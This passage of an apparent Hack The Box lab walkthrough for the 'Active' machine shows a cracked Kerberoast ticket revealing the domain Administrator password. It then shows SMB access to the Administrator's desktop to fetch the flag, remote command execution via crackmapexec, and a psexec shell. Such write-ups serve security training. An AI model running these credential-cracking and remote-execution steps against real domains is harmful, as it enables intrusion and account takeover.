+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$94506f5d90053381c99bd11484476521$243e8882bd4e074a15f15449ed87a8767d56a9b205d87e8ce54922160628a63aa06f291d60c410f06970b7c8532f20e6a012ea2f143a3cde54def7181042db3e209a1b9eaf59e5098ecd4e7d943e6fb5c94679222462de0143ab4c4419bd59b18b8b46a34de03609d67e6208679b5ca18dc6a1e4f05fd52bb351a494264ff284f10f44a39a630710a3bcc4e408a573582a4810eca1d7e5c30c6531b6defef3b7d92e1a0d616eef6c95190a7e6ddd5da91b70a695b0a4ccfa2b4c9658288060d45011b353e348a9a2c2a7c36281a5b305874506c17ad9abf9e7fd145f359afad3cf1762a9cd1c7a6c4725931545043049e98d2af2d68d488e70dda7b349a8e15fbb9d753653916dbcfb9a1fa9788722ab8af64f548b4e7876f9d1944a43806f092a4d9ed56b64818651f0f73351a30b96a52cee6dd9960a03bdb3b639e908c577787407b5904e27275881325aab798c84be0bf408426b68e1ade1a15656063542104021a942fe9d0fbeb7aaa297b9f8908fe835d6cbd0e77565ab42c7b6d4fc4e71904aacd73e2af7ce76928f63541469974fb2d1e55b0caa3abd1fd504933f2525b144ee7505feea6b6915454730f1b73bc4ce060cdf41a8d4ea2ffadfa5414b1886b5f50ecc9e5913e4c3cef47166c92020873fdfd8e45b00a05659462093e973ab1d174fea928f7498dc1cf167e07b9c33ed261f7380c1fefcc7c6624716c687e36c87ae831f18665feda887d093eda7ed4c4069e200318f25d86cd084c8a49f0af0fef1ad81306be5e20bc79f55eefa130b9645ae4ea03fd6b1c1e1c5c71c05c65a3252ddc6ce9bbfbc7a9f1a7f740328c6a944508843a4b0820901bfa6fe342ca40bf74b46387c38e4ab96e31a75a6ca2d20b5528db85e92cf7c12dc31e2abefda5ceafec7c0ae03a6817d4994368e3562017c9cdda20221ddd7623adc445a5836be61ec64f34bd76f27f9a265f5359f91668cf58e31884b98d0906a42d455b5d64e81c7efe66d1bce6a48a94d8595d9f86593c7f2ec21850302b4b3ac3027c1c05a769cb47a8d1c8a4bca8ef59e02a5773fea807c883750e4283ec96999247705e51440adc7acc3ea04e79b03f750e5c9ab1abc1300d5d30c63287f3acf7aad6679f86a969f41b3e3a23efa131b847bd0cb8302b83ed6cfcff77e20679bf99558d1dd36024fb6f984c41ad42338d292eda1f2075fa83ace42e351365db531eac22625c3838dc272469a40fa7f7e6dcee10f31cca5537779:Ticketmaster1968
+</code></pre><h2 id="174d1b9f-8847-8076-a37f-d20743cc521b" class="">Flag</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80d0-9411-d09bcf0cb099" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -U &#x27;Administrator&#x27; \\\\10.10.10.100\\Users
+Password for [WORKGROUP\Administrator]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd Administrator\
+smb: \Administrator\&gt; ls
+  .                                   D        0  Mon Jul 16 05:14:21 2018
+  ..                                  D        0  Mon Jul 16 05:14:21 2018
+  AppData                           DHn        0  Mon Jan  6 20:41:28 2025
+  Application Data                DHSrn        0  Mon Jul 16 05:14:15 2018
+  Contacts                           DR        0  Mon Jul 30 08:50:10 2018
+  Cookies                         DHSrn        0  Mon Jul 16 05:14:15 2018
+  Desktop                            DR        0  Thu Jan 21 11:49:47 2021
+  Documents                          DR        0  Mon Jul 30 08:50:10 2018
+  Downloads                          DR        0  Thu Jan 21 11:52:32 2021
+  Favorites                          DR        0  Mon Jul 30 08:50:10 2018
+  Links                              DR        0  Mon Jul 30 08:50:10 2018
+  Local Settings                  DHSrn        0  Mon Jul 16 05:14:15 2018
+  Music                              DR        0  Mon Jul 30 08:50:10 2018
+  My Documents                    DHSrn        0  Mon Jul 16 05:14:15 2018
+  NetHood                         DHSrn        0  Mon Jul 16 05:14:15 2018
+  NTUSER.DAT                       AHSn   524288  Mon Jan  6 20:42:17 2025
+  ntuser.dat.LOG1                   AHS   262144  Mon Jan  6 21:29:19 2025
+  ntuser.dat.LOG2                   AHS        0  Mon Jul 16 05:14:09 2018
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Mon Jul 16 05:14:15 2018
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jul 16 05:14:15 2018
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jul 16 05:14:15 2018
+  ntuser.ini                         HS       20  Mon Jul 16 05:14:15 2018
+  Pictures                           DR        0  Mon Jul 30 08:50:10 2018
+  PrintHood                       DHSrn        0  Mon Jul 16 05:14:15 2018
+  Recent                          DHSrn        0  Mon Jul 16 05:14:15 2018
+  Saved Games                        DR        0  Mon Jul 30 08:50:10 2018
+  Searches                           DR        0  Mon Jul 30 08:50:10 2018
+  SendTo                          DHSrn        0  Mon Jul 16 05:14:15 2018
+  Start Menu                      DHSrn        0  Mon Jul 16 05:14:15 2018
+  Templates                       DHSrn        0  Mon Jul 16 05:14:15 2018
+  Videos                             DR        0  Mon Jul 30 08:50:10 2018
+c
+		5217023 blocks of size 4096. 278823 blocks available
+smb: \Administrator\&gt; cd Desktop\
+smb: \Administrator\Desktop\&gt; ls
+  .                                  DR        0  Thu Jan 21 11:49:47 2021
+  ..                                 DR        0  Thu Jan 21 11:49:47 2021
+  desktop.ini                       AHS      282  Mon Jul 30 08:50:10 2018
+  root.txt                           AR       34  Mon Jan  6 20:42:12 2025
+
+		5217023 blocks of size 4096. 278823 blocks available
+smb: \Administrator\Desktop\&gt; get root.txt 
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-8084-884f-cae21d673206" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ cat root.txt        
+7******************************b
+</code></pre><h2 id="174d1b9f-8847-8096-9080-cae0330e870f" class="">Shell: Two ways(1: just executing commands and downloading reverse shell or 2: with impacket)</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-8016-8dcb-d73c53b02113" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ crackmapexec smb 10.10.10.100 -u &#x27;Administrator&#x27; -p &#x27;Ticketmaster1968&#x27; -x &#x27;whoami&#x27;
+
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+SMB         10.10.10.100    445    DC               [+] Executed command 
+SMB         10.10.10.100    445    DC               active\administrator
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80fa-880b-cd8611416228" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ impacket-psexec 10.10.10.100/Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file IKVbWpIg.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service yPgL on 10.10.10.100.....
+[*] Starting service yPgL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
